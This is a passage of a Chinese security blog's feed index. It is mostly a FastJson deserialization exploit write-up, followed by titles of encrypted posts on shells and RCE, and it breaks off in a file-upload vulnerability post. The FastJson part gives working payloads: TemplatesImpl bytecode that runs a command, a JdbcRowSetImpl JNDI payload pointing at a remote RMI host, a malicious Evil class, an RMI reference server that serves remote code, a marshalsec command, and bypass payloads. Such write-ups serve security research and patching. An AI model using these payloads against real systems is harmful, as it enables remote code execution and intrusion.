class="string">&quot;yv66vgAAADEANAcAAgEAC3BlcnNvbi9UZXN0BwAEAQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAEABjxpbml0PgEAAygpVgEACkV4Y2VwdGlvbnMHAAkBABNqYXZhL2lvL0lPRXhjZXB0aW9uAQAEQ29kZQoAAwAMDAAFAAYKAA4AEAcADwEAEWphdmEvbGFuZy9SdW50aW1lDAARABIBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7CAAUAQAfL3Vzci9iaW4vdG91Y2ggL3RtcC9zdWNjZXNzLnR4dAoADgAWDAAXABgBAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7AQAPTGluZU51bWJlclRhYmxlAQASTG9jYWxWYXJpYWJsZVRhYmxlAQAEdGhpcwEADUxwZXJzb24vVGVzdDsBAAl0cmFuc2Zvcm0BAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIZG9jdW1lbnQBAC1MY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTsBAAhpdGVyYXRvcgEANUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7AQAHaGFuZGxlcgEAQUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQByKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO1tMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWBwAnAQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQAIaGFuZGxlcnMBAEJbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsBAARtYWluAQAWKFtMamF2YS9sYW5nL1N0cmluZzspVgcALQEAE2phdmEvbGFuZy9FeGNlcHRpb24KAAEADAEABGFyZ3MBABNbTGphdmEvbGFuZy9TdHJpbmc7AQABdAEAClNvdXJjZUZpbGUBAAlUZXN0LmphdmEAIQABAAMAAAAAAAQAAQAFAAYAAgAHAAAABAABAAgACgAAAEAAAgABAAAADiq3AAu4AA0SE7YAFVexAAAAAgAZAAAADgADAAAADwAEABAADQARABoAAAAMAAEAAAAOABsAHAAAAAEAHQAeAAEACgAAAEkAAAAEAAAAAbEAAAACABkAAAAGAAEAAAAVABoAAAAqAAQAAAABABsAHAAAAAAAAQAfACAAAQAAAAEAIQAiAAIAAAABACMAJAADAAEAHQAlAAIABwAAAAQAAQAmAAoAAAA/AAAAAwAAAAGxAAAAAgAZAAAABgABAAAAGQAaAAAAIAADAAAAAQAbABwAAAAAAAEAHwAgAAEAAAABACgAKQACAAkAKgArAAIABwAAAAQAAQAsAAoAAABBAAIAAgAAAAm7AAFZtwAuTLEAAAACABkAAAAKAAIAAAAcAAgAHQAaAAAAFgACAAAACQAvADAAAAAIAAEAMQAcAAEAAQAyAAAAAgAz&quot;</span><span class="punctuation">]</span><span class="punctuation">,</span>&#x27;_name&#x27;<span class="punctuation">:</span>&#x27;a.b&#x27;<span class="punctuation">,</span>&#x27;_tfactory&#x27;<span class="punctuation">:</span><span class="punctuation">&#123;</span> <span class="punctuation">&#125;</span><span class="punctuation">,</span><span class="attr">&quot;_outputProperties&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span> <span class="punctuation">&#125;</span><span class="punctuation">,</span><span class="attr">&quot;_name&quot;</span><span class="punctuation">:</span><span class="string">&quot;a&quot;</span><span class="punctuation">,</span><span class="attr">&quot;_version&quot;</span><span class="punctuation">:</span><span class="string">&quot;1.0&quot;</span><span class="punctuation">,</span><span class="attr">&quot;allowedProtocols&quot;</span><span class="punctuation">:</span><span class="string">&quot;all&quot;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p><strong>Feature.SupportNonPublicField</strong></p><p>在漏洞触发时必须传入 <code>Feature.SupportNonPublicField</code>参数，这也成了该条利用链的限制，导致不是很通用</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">JSON.parse(poc,Feature.SupportNonPublicField);</span><br></pre></td></tr></table></figure><p>这是因为POC中有一些private属性，而且 <code>TemplatesImpl</code>类中没有相应的set方法，所以需要传入该参数让其支持非public属性，当然如果private属性存在相应set方法的话，FastJson会自动调用其set方法完成赋值，不需要 <code>Feature.SupportNonPublicField</code>参数</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.Feature;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        String json=<span class="string">&quot;&#123;\&quot;name\&quot;:\&quot;L0ki\&quot;,\&quot;age\&quot;:21&#125;&quot;</span>;</span><br><span class="line">        System.out.println(json);</span><br><span class="line">        Person person1=JSON.parseObject(json,Person.class, Feature.SupportNonPublicField);</span><br><span class="line">        Person person2=JSON.parseObject(json,Person.class);</span><br><span class="line"></span><br><span class="line">        System.out.println(person1);</span><br><span class="line">        System.out.println(person2);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Person</span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> age;</span><br><span class="line">    <span class="keyword">public</span> String name;</span><br><span class="line">    Person()&#123;</span><br><span class="line">    &#125;</span><br><span class="line">    Person(<span class="type">int</span> age,String name)&#123;</span><br><span class="line">        <span class="built_in">this</span>.age=age;</span><br><span class="line">        <span class="built_in">this</span>.name=name;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Person&#123;&quot;</span> +</span><br><span class="line">                <span class="string">&quot;age=&quot;</span> + age +</span><br><span class="line">                <span class="string">&quot;, name=&#x27;&quot;</span> + name + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&#x27;&#125;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="POC—基于JNDI-JdbcRowSetImpl"><a href="#POC—基于JNDI-JdbcRowSetImpl" class="headerlink" title="POC—基于JNDI+JdbcRowSetImpl"></a>POC—基于JNDI+JdbcRowSetImpl</h3><p><strong>分析流程</strong></p><ol><li>查找远程对象的可控参数 <code>getDataSourceName()</code></li><li>设置该参数 <code>setDataSourceName(String var1)</code></li><li>提交该参数 <code>setAutoCommit(boolean var1)</code></li></ol><p>JdbcRowSetImpl</p><p><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/image-20200803132635793.png" alt="image-20200803132635793"></p><p>查找远程对象</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">this</span>.getDataSourceName() != <span class="literal">null</span>) &#123;</span><br><span class="line">           <span class="keyword">try</span> &#123;</span><br><span class="line">               <span class="type">InitialContext</span> <span class="variable">var1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InitialContext</span>();</span><br><span class="line">               <span class="type">DataSource</span> <span class="variable">var2</span> <span class="operator">=</span> (DataSource)var1.lookup(<span class="built_in">this</span>.getDataSourceName());</span><br><span class="line">               <span class="keyword">return</span> <span class="built_in">this</span>.getUsername() != <span class="literal">null</span> &amp;&amp; !<span class="built_in">this</span>.getUsername().equals(<span class="string">&quot;&quot;</span>) ? var2.getConnection(<span class="built_in">this</span>.getUsername(), <span class="built_in">this</span>.getPassword()) : var2.getConnection();</span><br><span class="line">           &#125;</span><br></pre></td></tr></table></figure><p>如果 <code>this.getDataSourceName()</code> 可控且能触发 <code>connect()</code>便有可能实现JNDI注入达到RCE</p><p><code>setDataSourceName(String var1)</code>函数赋值 <code>dataSourceName</code></p><p><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/image-20200803133940841.png" alt="image-20200803133940841"></p><p><code>setAutoCommit(boolean var1)</code>函数调用了 <code>connect()</code></p><p><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/image-20200803134212832.png" alt="image-20200803134212832"></p><p>FastJson会自动调用setter来完成对对象属性的赋值，所以这里payload</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;@type&quot;</span>:<span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span>,</span><br><span class="line">    <span class="string">&quot;dataSourceName&quot;</span>:<span class="string">&quot;rmi://ip:port/Evil&quot;</span>,</span><br><span class="line">    <span class="string">&quot;autoCommit&quot;</span>:<span class="literal">true</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先 <code>@type</code>字段会指定反序列化 <code>com.sun.rowset.JdbcRowSetImpl</code>类</p><p>然后调用 <code>setDataSourceName(String var1)</code>对 <code>dataSourceName</code>赋值，这里赋值为恶意的RMI服务地址</p><p>最后调用 <code>setAutoCommit(boolean var1)</code>从而调用 <code>connect()</code>触发JNDI注入,<code>autoCommit</code>的值类型是 <code>boolean</code>，这里设置 <code>true</code>或 <code>false</code>都可，JNDI注入部分可以参考<a href="https://mp.weixin.qq.com/s/cyeEAv31GO_hZCTXVRBkxw">深入理解JNDI注入与Java反序列化漏洞利用</a></p><p>下面构造一个恶意类，其中执行命令的代码可以放在构造方法，<code>getObjectInstance()</code>方法或者静态代码块中</p><p><code>javac Evil.java</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Evil</span> &#123;</span><br><span class="line">    <span class="keyword">static</span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>利用一</strong></p><p>通过RMI服务返回一个 <code>JNDI Naming Reference</code>，受害者解码 <code>Reference</code>时会去我们指定的 <code>Codebase</code>远程地址加载 <code>Factory类</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.jndi.rmi.registry.ReferenceWrapper;</span><br><span class="line"><span class="keyword">import</span> javax.naming.Reference;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">App</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">( String[] args )</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        System.setProperty(<span class="string">&quot;java.rmi.server.hostname&quot;</span>,<span class="string">&quot;ip&quot;</span>);<span class="comment">//ip为服务器外网地址</span></span><br><span class="line"></span><br><span class="line">        <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.createRegistry(<span class="number">9999</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">remote_class_server</span> <span class="operator">=</span> <span class="string">&quot;http://ip:80/&quot;</span>;<span class="comment">//恶意对象地址</span></span><br><span class="line">        <span class="type">Reference</span> <span class="variable">reference</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Reference</span>(<span class="string">&quot;Evil&quot;</span>, <span class="string">&quot;Evil&quot;</span>, remote_class_server);</span><br><span class="line">        <span class="type">ReferenceWrapper</span> <span class="variable">referenceWrapper</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ReferenceWrapper</span>(reference);</span><br><span class="line">        registry.bind(<span class="string">&quot;Evil&quot;</span>, referenceWrapper);</span><br><span class="line">        System.out.println(<span class="string">&quot;start...&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>利用二</strong></p><p>借助<a href="https://github.com/mbechler/marshalsec">marshalsec</a>项目，直接启动一个RMI服务器，监听9999端口，并制定加载远程类 <code>Evil.class</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp marshalsec-<span class="number">0.0</span><span class="number">.3</span>-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer <span class="string">&quot;http://ip/#Evil&quot;</span> <span class="number">9999</span></span><br></pre></td></tr></table></figure><p>最后运行漏洞代码加载payload</p><p><strong>注意</strong></p><p>在高版本中Java限制了 <code>Naming/Directory</code>服务中 <code>JNDI Reference</code>远程加载 <code>Object Factory类</code>的特性。默认不允许从远程的 <code>Codebase</code>加载 <code>Reference</code>工厂类。如果需要开启 <code> RMI Registry</code> 或者 <code> COS Naming Service Provider</code>的远程类加载功能，需要将相关属性值设置为 <code>true</code></p><p><strong>本地复现</strong></p><p><code>test.java</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">( String[] args )</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        System.setProperty(<span class="string">&quot;com.sun.jndi.rmi.object.trustURLCodebase&quot;</span>, <span class="string">&quot;true&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">payload</span> <span class="operator">=</span> <span class="string">&quot;&#123;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;    \&quot;@type\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;,\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;    \&quot;dataSourceName\&quot;:\&quot;rmi://ip:9999/Evil\&quot;,\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;    \&quot;autoCommit\&quot;:true\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;&#125;&quot;</span>;</span><br><span class="line">        JSON.parseObject(payload);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>通杀</strong></p><p><code>&#123;&quot;atype&quot;:&quot;java. lang. Class&quot;，&quot;val&quot;:&quot; com. sun. rowset . JdbcRowSetImpL&quot; &#125;</code></p><p><code>&#123;&quot;@type&quot; : &quot; com . sun. rowset . JdbcRowSetImpl&quot;，&quot; dataSourceName&quot;: &quot; rmi:/ ip/Exploit&quot;，&quot; autoCommit&quot;: true &#125;</code></p>]]></content>
      
      
      
        <tags>
            
            <tag> Vulnerabilities </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Axis2 Weak Password GetShell</title>
      <link href="/2020/07/29/Axis2-Weak-Password-GetShell/"/>
      <url>/2020/07/29/Axis2-Weak-Password-GetShell/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="dd3e07a3a44e8825dd2a35a4fcaa0fb1c7b8c96864e305eaa8a4323d40a2c845"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      
        <tags>
            
            <tag> Intranet Penetration </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ASP Arbitrary File Upload Webshell Large Trojan</title>
      <link href="/2020/07/29/ASP-Arbitrary-File-Upload-Webshell-Large-Trojan/"/>
      <url>/2020/07/29/ASP-Arbitrary-File-Upload-Webshell-Large-Trojan/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="3ee8d4d7eee3c06095670802a46f65a31dd707adddbb316ff42f5c02d39b54c2"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      
        <tags>
            
            <tag> Intranet Penetration </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JMX RMI RCE</title>
      <link href="/2020/07/29/JMX-RMI-RCE/"/>
      <url>/2020/07/29/JMX-RMI-RCE/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="99beadf1ceb77add994391e204afb80db86792ca21445e057edc75bcf324634a"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      
        <tags>
            
            <tag> Intranet Penetration </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HFS Server Remote Command Execution</title>
      <link href="/2020/07/29/HFS-Server-Remote-Command-Execution/"/>
      <url>/2020/07/29/HFS-Server-Remote-Command-Execution/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="6de185ab4dc0685c67d2d8860bde9589186f8400f4c75cbaefa8431049c8e654"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      
        <tags>
            
            <tag> Intranet Penetration </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>S2-008 Attack Utilization POC</title>
      <link href="/2020/07/29/S2-008-Attack-POC/"/>
      <url>/2020/07/29/S2-008-Attack-POC/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="ce93442e1434470f928795fe05dd6be75def6610f975982d299002655533790d"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      
        <tags>
            
            <tag> Intranet Penetration </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Tomcat AJP Unauthorized Access (CVE-2020-1938)</title>
      <link href="/2020/07/29/CVE-2020-1938/"/>
      <url>/2020/07/29/CVE-2020-1938/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="e423fa95297ab6b558f3d510d25a4a8c0897afef504d6ae559105278ef4e75f1"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      
        <tags>
            
            <tag> Intranet Penetration </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Oracle Database Server Remote Code Execution (RCE)</title>
      <link href="/2020/07/29/Oracle-Database-Server-RCE/"/>
      <url>/2020/07/29/Oracle-Database-Server-RCE/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="0998e5e33a1695eb7e5796682803d195f7b18e6d9a13ee4691fd470ff398d1de"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      
        <tags>
            
            <tag> Intranet Penetration </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>S2-016 (CVE-2013-2251)</title>
      <link href="/2020/07/29/S2-016-CVE-2013-2251/"/>
      <url>/2020/07/29/S2-016-CVE-2013-2251/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="8d481a48083139148b381feb48697b7eb5713b52a19ce05107922437baa908ec"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      
        <tags>
            
            <tag> Intranet Penetration </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>File Upload Vulnerabilities</title>
      <link href="/2020/07/16/File-Upload-Vulnerabilities/"/>
      <url>/2020/07/16/File-Upload-Vulnerabilities/</url>
      
        <content type="html"><![CDATA[<h2 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h2><p>程序员由于没有对上传的文件进行严格限定，导致黑客可以通过工具上传其他格式的程序文件（比如：webshell），这样黑客就会拿到一个可执行环境，在服务器上搞破坏。</p><h2 id="upload-labs思维导图"><a href="#upload-labs思维导图" class="headerlink" title="upload-labs思维导图"></a>upload-labs思维导图</h2><p><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/9113969-116edf0b414793b9.png" alt="mind-map.png"></p><h2 id="请求包描述"><a href="#请求包描述" class="headerlink" title="请求包描述"></a>请求包描述</h2><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/upload.php</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>localhost</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>274</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>max-age=0</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://localhost</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>multipart/form-data; boundary=----WebKitFormBoundaryuKS18BporicXJfTx</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate, br</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.8,de;q=0.6,en;q=0.4,fr;q=0.2</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"></span><br><span class="line"><span class="language-routeros">------WebKitFormBoundaryuKS18BporicXJfTx</span></span><br><span class="line"><span class="language-routeros">Content-Disposition: form-data; <span class="attribute">name</span>=<span class="string">&quot;file_x&quot;</span>; <span class="attribute">filename</span>=<span 